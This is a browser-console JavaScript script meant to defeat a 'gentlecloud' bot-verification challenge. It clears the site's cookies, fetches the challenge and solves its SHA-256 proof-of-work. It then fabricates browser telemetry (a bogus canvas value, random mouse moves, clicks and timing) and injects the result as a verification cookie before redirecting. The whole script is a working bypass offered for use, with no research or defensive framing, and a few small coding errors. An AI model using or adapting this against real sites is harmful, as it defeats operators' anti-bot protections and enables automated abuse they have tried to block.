(async function solveAndNavigate() {

    console.log('[*] Starting automated challenge solver...');

 

    // ====================================================================

    // 1. PRE-FLIGHT: WIPE EXISTING COOKIES

    // ====================================================================

    console.log('[*] Wiping stale session cookies...');

    document.cookie.split(";").forEach((c) => {

      document.cookie = c.replace(/^ +/, "").replace(/=.*/, "=;expires=" + new Date().toUTCString() + ";path=/");

    });

 

    // Embedded pure JS SHA-256 implementation

    function sha256(ascii) {

      const mathPow = Math.pow;

      const maxWord = mathPow(2, 32);

      let result = '';

      const words = [];

      const asciiBitLength = ascii.length * 8;

      let hash = sha256.h = sha256.h || [];

      let k = sha256.k = sha256.k || [];

      let primeCounter = k.length;

 

      const isPrime = (n) => {

        for (let factor = 2; factor <= Math.sqrt(n); factor++) {

          if (n % factor === 0) return false;

        }

        return true;

      };

 

      if (!primeCounter) {

        let candidate = 2;

        while (primeCounter < 64) {

          if (isPrime(candidate)) {

            if (primeCounter < 8) hash[primeCounter] = (mathPow(candidate, 1/2) * maxWord) | 0;

            k[primeCounter] = (mathPow(candidate, 1/3) * maxWord) | 0;

            primeCounter++;

          }

          candidate++;

        }

      }

 

      ascii += '\x80';

      while (ascii.length % 64 !== 56) ascii += '\x00';

      for (let i = 0; i < ascii.length; i++) {

        const j = ascii.charCodeAt(i);

        words[i >> 2] |= j << ((3 - i % 4) * 8);

      }

      words[words.length] = ((asciiBitLength / maxWord) | 0);

      words[words.length] = (asciiBitLength | 0);

 

      for (let j = 0; j < words.length; j += 16) {

        const w = words.slice(j, j + 16);

        const oldHash = hash.slice(0);

 

        for (let i = 0; i < 64; i++) {

          if (i >= 16) {

            const w15 = w[i - 15], w2 = w[i - 2];

            const s0 = ((w15 >>> 7) | (w15 << 25)) ^ ((w15 >>> 18) | (w15 << 14)) ^ (w15 >>> 3);

            const s1 = ((w2 >>> 17) | (w2 << 15)) ^ ((w2 >>> 19) | (w2 << 13)) ^ (w2 >>> 10);

            w[i] = (w[i - 16] + s0 + w[i - 7] + s1) | 0;

          }

 

          const s1 = ((hash[4] >>> 6) | (hash[4] << 26)) ^ ((hash[4] >>> 11) | (hash[4] << 21)) ^ ((hash[4] >>> 25) | (hash[4] << 7));

          const ch = (hash[4] & hash[5]) ^ (~hash[4] & hash[6]);

          const temp1 = (hash[7] + s1 + ch + k[i] + w[i]) | 0;

          const s0 = ((hash[0] >>> 2) | (hash[0] << 30)) ^ ((hash[0] >>> 13) | (hash[0] << 19)) ^ ((hash[0] >>> 22) | (hash[0] << 10));

          const maj = (hash[0] & hash[1]) ^ (hash[0] & hash[2]) ^ (hash[1] & hash[2]);

          const temp2 = (s0 + maj) | 0;

 

          hash = [(temp1 + temp2) | 0].concat(hash);

          hash[4] = (hash[4] + temp1) | 0;

          hash.pop();

        }

 

        for (let i = 0; i < 8; i++) hash[i] = (hash[i] + oldHash[i]) | 0;

      }

 

      for (let i = 0; i < 8; i++) {

        for (let j = 3; j >= 0; j--) {

          const b = (hash[i] >> (j * 8)) & 255;

          result += (b < 16 ? '0' : '') + b.toString(16);

        }

      }

      return result;

    }

 

    try {

      // ====================================================================

      // 2. FETCH CHALLENGE

      // ====================================================================

      console.log('[*] Fetching fresh challenge endpoint...');

      const resp = await fetch('/challenge/get_challenge');

      if (!resp.ok) throw new Error(`HTTP status ${resp.status}`);

      const data = await resp.json();

      if (!data || !data.challenge) throw new Error('Invalid challenge structure');

     

      const chal = data.challenge;

      console.log(`[+] Challenge acquired: "${chal}"`);

 

      // ====================================================================

      // 3. SOLVE PROOF OF WORK (TRACK 1)

      // ====================================================================

      console.log('[*] Solving cryptographic PoW (target: 0000)...');

      let nonce = 0;

      while (true) {

        if (sha256(chal + nonce).startsWith('0000')) break;

        nonce++;

        if (nonce > 10000000) throw new Error('Max nonce reached');

      }

      console.log(`[+] PoW Solved! Nonce: ${nonce}`);

 

      // ====================================================================

      // 4. BUILD SPOOFED PAYLOAD (TRACK 2)

      // ====================================================================

      console.log('[*] Building spoofed telemetry payload...');

      const randomMoves = Math.floor(Math.random() * (100 - 50 + 1)) + 50;  // 50 to 100

      const randomClicks = Math.floor(Math.random() * (5 - 1 + 1)) + 1;     // 1 to 5

      const proof = {

        canvas: "data:image/png;base64,BOGUS_CANVAS_DATA_THAT_IS_LONG_ENOUGH_TO_PASS_LENGTH_CHECKS",

        mouse_moves: randomMoves,

        mouse_clicks: randomClicks,

        screen: "${window.screen.width}x${window.screen.height}",

        ua: "${navigator.useragent}",

        timing: Math.floor(Math.random() * (5000 - 3000 + 1)) + 3000,

        challenge: chal,

        nonce: nonce,

        timestamp: Date.now()

      };

 

      const proofB64 = btoa(JSON.stringify(proof));

 

      // ====================================================================

      // 5. LOG DETAILS AND AUTO-EXECUTE COOKIE INJECTION & REDIRECT

      // ====================================================================

      console.log("%c✅ CHALLENGE SOLVED & TELEMETRY SPOOFED!", "color: #00ff00; font-weight: bold; font-size: 14px;");

      console.log(`[+] Cookie Value: gentlecloud_verified=${proofB64}`);

 

      // Set cookie automatically

      document.cookie = `gentlecloud_verified=${proofB64}; path=/; max-age=1800;`;

      console.log('[+] Cookie successfully injected into session.');

 

      // Redirect to root

      console.log('[*] Redirecting to root (/) ...');

      window.location.href = '/';

 

    } catch (err) {

      console.error(`[-] Automation Failed: ${err.message}`);

    }

  })();